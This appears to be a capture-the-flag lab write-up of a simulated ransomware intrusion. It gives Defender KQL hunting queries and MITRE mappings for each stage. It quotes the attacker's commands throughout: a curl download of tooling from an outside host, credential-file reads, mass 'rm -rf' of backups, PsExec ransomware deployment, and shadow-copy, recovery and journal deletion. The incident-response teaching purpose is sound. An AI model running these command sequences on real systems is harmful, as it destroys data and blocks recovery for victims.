# SOC Incident Investigation – Azuki Import/Export Compromise

**Scenario:** Dead in the Water – Azuki Import/Export

**Date of Incident:** November 27 2025  

## Platforms and Languages Leveraged
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)

---

##  Scenario
The Dead in the Water – Azuki Import/Export report documents a full ransomware intrusion lifecycle, from backup infrastructure compromise through ransomware deployment, recovery inhibition, persistence, and anti-forensic activity. It was intentionally kept concise to quickly surface the most important findings and maintain investigative momentum, focusing on key indicators, observations, and response-relevant conclusions rather than excessive detail. The findings directly informed containment actions and guided the next phase of the investigation. Each section corresponds to a validated CTF flag and includes:
- **What happened (finding)**
- **Why it matters (impact)**
- **MITRE ATT&CK mapping**
- **Representative KQL used to identify the activity**

---

High-Level Indicators of Compromise (IoC) Discovery Plan
Check DeviceFileEvents for any .exe file events.
Check DeviceProcessEvents for any signs of installation or usage.
Check DeviceNetworkEvents for any signs of IP connections inbound/outbound or port usage.
Check DeviceRegistryEvents for any signs of registry key creations, modifications, and deletions.

---

## PHASE 1 – Linux Backup Server Compromise (FLAGS 1–12)

### FLAG 1 – Remote Access via SSH
**Finding:** Attackers pivoted from a compromised Windows workstation into the Linux backup server using SSH.

**Command Identified:**
```
"ssh.exe" backup-admin@10.1.0.189
```

**MITRE:** T1021.004 – Remote Services (SSH)

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where FileName contains "ssh"
| where ProcessCommandLine has "10.1.0.189"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated asc
```

---
<img width="909" height="228" alt="Screenshot 2026-01-21 at 11 37 43 AM" src="https://github.com/user-attachments/assets/3e5c2493-7470-4f13-94f0-bb7712d06391" />


### FLAG 2 – Attack Source IP
**Finding:** SSH access originated from a compromised internal workstation.

**Source IP:**
```
10.1.0.108
```

**MITRE:** T1021.004 – Remote Services

**KQL:**
```kql
DeviceNetworkEvents
| where DeviceName contains "azuki"
| where RemoteIP == "10.1.0.189" 
| project TimeGenerated, DeviceName, LocalIP, RemoteIP, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

---
<img width="1439" height="232" alt="Screenshot 2026-01-21 at 11 40 39 AM" src="https://github.com/user-attachments/assets/fb525a1d-5dc4-40b3-bd9b-04452ba8dc18" />


### FLAG 3 – Compromised Account
**Finding:** A privileged backup account was abused.

**Account:**
```
backup-admin
```

**MITRE:** T1078.002 – Valid Accounts (Domain / Privileged Accounts)

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where AccountName == "backup-admin"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---
<img width="819" height="142" alt="Screenshot 2026-01-21 at 11 53 55 AM" src="https://github.com/user-attachments/assets/6d4b874b-7ae8-45bc-bf9c-02355a7ceacc" />


### FLAG 4 – Directory Enumeration
**Finding:** Attackers enumerated backup directory contents to identify targets.

**Command:**
```
ls --color=auto -la /backups/
```

**MITRE:** T1083 – File and Directory Discovery

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where AccountName == "backup-admin"
| where FileName == "ls"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---
<img width="775" height="143" alt="Screenshot 2026-01-21 at 11 56 50 AM" src="https://github.com/user-attachments/assets/115972cb-1d21-4e25-a25a-212ad5d55c51" />


### FLAG 5 – File Search
**Finding:** Attackers searched for compressed backup archives to prioritize high-value targets for destruction/exfil.

**Command:**
```
find /backups -name *.tar.gz
```

**MITRE:** T1083 – File and Directory Discovery

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where AccountName == "backup-admin"
| where ProcessCommandLine contains "find"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---
<img width="1087" height="171" alt="Screenshot 2026-01-21 at 12 00 15 PM" src="https://github.com/user-attachments/assets/748a00fc-30e2-4342-b291-cf3a281651a7" />


### FLAG 6 – Local Account Enumeration
**Finding:** The attacker enumerated local Linux user accounts to understand the system’s user base and potential privilege boundaries.

**Command:**
```
cat /etc/passwd
```

**MITRE:** T1087.001 – Account Discovery (Local Account)

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine has "cat /etc"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```
---
<img width="606" height="117" alt="image" src="https://github.com/user-attachments/assets/526a83b1-a5c2-4a81-8bb8-ac0250c373c4" />


### FLAG 7 – Scheduled Job Reconnaissance
**Finding:** The attacker inspected cron scheduling to identify backup routines and timing.

**Command:**
```
cat /etc/crontab
```

**MITRE:** T1083 – File and Directory Discovery

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine has "cat /etc"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---
<img width="633" height="115" alt="image" src="https://github.com/user-attachments/assets/c6663ee4-4fbc-421c-b484-7bc1f9aeb96e" />


### FLAG 8 – Tool Transfer
**Finding:** The attacker pulled an external archive containing destructive tooling.

**Command:**
```
curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z
```

**MITRE:** T1105 – Ingress Tool Transfer

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine has "curl -L"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```
---
<img width="638" height="145" alt="image" src="https://github.com/user-attachments/assets/bceea745-979b-476a-bc7a-376b29b484d9" />

### FLAG 9 – Credential Theft
**Finding:** Plaintext credentials were accessed from backup configuration artifacts.

**Command:**
```
cat /backups/configs/all-credentials.txt
```

**MITRE:** T1552.001 – Unsecured Credentials (Credentials in Files)

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where AccountName == "backup-admin"
| where ProcessCommandLine contains "credentials"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---
<img width="1111" height="164" alt="Screenshot 2026-01-21 at 12 14 47 PM" src="https://github.com/user-attachments/assets/76b99476-aaa1-4f3b-823c-9c263ebca9dc" />


### FLAG 10 – Backup Destruction
**Finding:** Backup data was deleted to eliminate recovery options before Windows ransomware deployment.

**Command (first directory path sufficient per flag instructions):**
```
 rm -rf /backups/archives /backups/azuki-adminpc /backups/azuki-fileserver /backups/azuki-logisticspc /backups/config-backups /backups/configs /backups/daily /backups/database-backups /backups/databases /backups/fileserver /backups/logs /backups/monthly /backups/weekly /backups/workstations```

**MITRE:** T1485 – Data Destruction

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine has "rm -rf /backups" 
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```
---
<img width="1000" height="159" alt="image" src="https://github.com/user-attachments/assets/2ada54f3-6923-462e-b276-8b4b1cb39e31" />


### FLAG 11 – Backup Service Stopped
**Finding:** The attacker stopped cron to immediately halt scheduled jobs (non-persistent).

**Command:**
```
systemctl stop cron
```

**MITRE:** T1489 – Service Stop

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine has "systemctl stop"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```
---
<img width="661" height="144" alt="image" src="https://github.com/user-attachments/assets/e62e5dfa-798d-427a-8635-c8a5140e0993" />

### FLAG 12 – Backup Service Disabled
**Finding:** The attacker disabled cron to prevent scheduled jobs from starting on boot (persistent).

**Command:**
```
systemctl disable cron
```

**MITRE:** T1489 – Service Stop

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine has "systemctl disable"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```
---
<img width="672" height="144" alt="image" src="https://github.com/user-attachments/assets/599ba84a-d635-4b15-9c29-32736ef9bf45" />

### FLAG 13 – Remote Execution Tool
**Finding:** PsExec was used for lateral command execution over admin shares.

**Tool:**
```
PsExec64.exe
```

**MITRE:** T1021.002 – SMB / Windows Admin Shares

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where FileName == "PsExec64.exe"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated asc
```
---
<img width="737" height="29" alt="image" src="https://github.com/user-attachments/assets/8341a64c-6eaa-4970-9d42-545f569db443" />


### FLAG 14 – Deployment Command
**Finding:** The attacker used PsExec to copy and execute the ransomware payload on remote systems.

**Command (password redacted):**
```
"PsExec64.exe" \\10.1.0.188 -u fileadmin -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe```

**MITRE:** T1021.002 – SMB / Windows Admin Shares

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where FileName == "PsExec64.exe"
| where ProcessCommandLine has "silentlynx.exe"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```
---
<img width="786" height="141" alt="Screenshot 2026-01-24 at 4 20 34 PM" src="https://github.com/user-attachments/assets/840bbaef-82f6-406c-aa43-b055b449ba36" />

### FLAG 15 – Malicious Payload
**Finding:** The ransomware binary name was identified for environment-wide hunting.

**Payload:**
```
silentlynx.exe
```

**MITRE:** T1204.002 – User Execution (Malicious File)

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where FileName == "silentlynx.exe"
| where ProcessCommandLine has "silentlynx.exe"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---
<img width="457" height="143" alt="image" src="https://github.com/user-attachments/assets/6c6f4814-7927-4008-ac48-7d67bd129b67" />


## PHASE 3 – Recovery Inhibition (FLAGS 16–22)

### FLAG 16 – Shadow Service Stopped
**Finding:** The ransomware stopped the Volume Shadow Copy Service to prevent snapshot-based recovery during encryption.

**Command:**
```
"net" stop VSS /y
```

**MITRE:** T1490 – Inhibit System Recovery

**KQL:****
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine has "stop"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---
<img width="454" height="143" alt="image" src="https://github.com/user-attachments/assets/776ad3c6-c26c-45f2-affc-c7bfc5baaa6f" />


### FLAG 17 – Backup Engine Stopped
**Finding:** Windows Backup Engine was stopped to halt backup operations and dependent services.

**Command:**
```
"net" stop wbengine /y
```

**MITRE:** T1490 – Inhibit System Recovery

**KQL (tight + time pivot around payload):**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine contains "engine"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---
<img width="468" height="143" alt="image" src="https://github.com/user-attachments/assets/d8d3b8b6-9c2e-405b-8bc6-ba7f278cd81f" />


### FLAG 18 – Process Termination (Unlock Files)
**Finding:** Database services were forcefully terminated to release file locks prior to encryption.

**Command:**
```
"taskkill" /F /IM sqlservr.exe
```

**MITRE:** T1562.001 – Impair Defenses (Disable or Modify Tools)

**KQL:****
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine contains "taskkill"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---
<img width="558" height="145" alt="image" src="https://github.com/user-attachments/assets/d23c00d7-7413-40a0-9524-b22766ddc817" />


### FLAG 19 – Recovery Point Deletion
**Finding:** All existing shadow copies were deleted to remove local restore points.

**Command:**
```
"vssadmin" delete shadows /all /quiet
```

**MITRE:** T1490 – Inhibit System Recovery

**KQL:****
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine contains "delete shadows"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---
<img width="481" height="142" alt="image" src="https://github.com/user-attachments/assets/9f3d1f19-7774-4f7e-bbe8-e86afa37e3e6" />


### FLAG 20 – Storage Limitation
**Finding:** Shadow storage was resized to prevent creation of new recovery points.

**Command:**
```
"vssadmin" resize shadowstorage /for=C: /on=C: /maxsize=401MB
```

**MITRE:** T1490 – Inhibit System Recovery

**KQL (tight + command equality):**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine contains "resize shadowstorage"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc

```

---
<img width="617" height="144" alt="image" src="https://github.com/user-attachments/assets/568b9a9d-0693-447e-8469-2815014ea125" />

### FLAG 21 – Recovery Disabled
**Finding:** Windows recovery features were disabled to block automatic repair after system corruption.

**Command:**
```
"bcdedit" /set {default} recoveryenabled No
```

**MITRE:** T1490 – Inhibit System Recovery

**KQL:****
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine contains "bcdedit"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---
<img width="525" height="146" alt="image" src="https://github.com/user-attachments/assets/e469196d-7a27-442f-b19b-5fa27df6df84" />

### FLAG 22 – Catalog Deletion
**Finding:** The Windows Backup catalog was deleted, making backups undiscoverable even if files remained.

**Command:**
```
"wbadmin" delete catalog -quiet
```

**MITRE:** T1490 – Inhibit System Recovery

**KQL:****
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine contains "wbadmin"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---
<img width="578" height="145" alt="image" src="https://github.com/user-attachments/assets/e3d5b37a-198c-431e-a080-f50d61eb5a5d" />

## PHASE 4 – Persistence (FLAGS 23–24)

### FLAG 23 – Registry Autorun
**Finding:** A Run-key style autorun value masqueraded as a Windows security component to persist across reboots.

**Registry Value Name:**
```
WindowsSecurityHealth
```

**MITRE:** T1547.001 – Registry Run Keys / Startup Folder

**KQL (tight: only Run/RunOnce + value name):**
```kql
DeviceRegistryEvents
| where DeviceName contains "azuki"
| where RegistryKey has "run"
| where InitiatingProcessFileName == "silentlynx.exe"
| project TimeGenerated, DeviceName, RegistryKey, RegistryValueName, RegistryValueData,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

---
<img width="1009" height="203" alt="image" src="https://github.com/user-attachments/assets/7b39aeb7-81a8-4d6e-b93b-7177ab843b89" />

### FLAG 24 – Scheduled Task Persistence
**Finding:** A scheduled task was created to ensure the ransomware (or helper component) re-executes reliably.

**Task Path:**
```
\Microsoft\Windows\Security\SecurityHealthService
```

**MITRE:** T1053.005 – Scheduled Task/Job

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where InitiatingProcessFileName == "silentlynx.exe"
| where ProcessCommandLine has "create"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```
---
<img width="1019" height="145" alt="image" src="https://github.com/user-attachments/assets/853f159a-a55b-4149-9e66-1f6b7286bfc9" />

## PHASE 5 – Anti‑Forensics (FLAG 25)

### FLAG 25 – Journal Deletion
**Finding:** The NTFS USN Journal was deleted to remove forensic artifacts that track file system changes.

**Command:**
```
"fsutil.exe" usn deletejournal /D C:
```

**MITRE:** T1070.004 – Indicator Removal on Host (File Deletion)

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine has "deletejournal"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```
---
<img width="548" height="143" alt="image" src="https://github.com/user-attachments/assets/8bf1864f-00d3-492d-915c-ab873098c88d" />

## PHASE 6 – Ransomware Success (FLAG 26)

### FLAG 26 – Ransom Note
**Finding:** Ransom note artifacts confirm successful encryption and provide attacker instructions.

**Filename:**
```
SILENTLYNX_README.txt
```

**MITRE:** T1486 – Data Encrypted for Impact

**KQL:**
```kql
DeviceFileEvents
| where DeviceName contains "azuki"
| where FileName == "SILENTLYNX_README.txt"
| project TimeGenerated, DeviceName, ActionType, FolderPath, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```
---
<img width="982" height="32" alt="image" src="https://github.com/user-attachments/assets/bd8826a7-2def-4d4b-98d0-6ab7fe9de1f1" />

## Conclusion
This incident demonstrates a **methodical, multi‑stage ransomware operation** with deliberate focus on:
- Backup and recovery destruction **before** encryption
- Lateral deployment via admin tooling
- Persistent access and anti‑forensic cleanup

Result

The attacker achieved full operational impact with minimal resistance, underscoring gaps in backup isolation, credential hygiene, and endpoint monitoring.

---

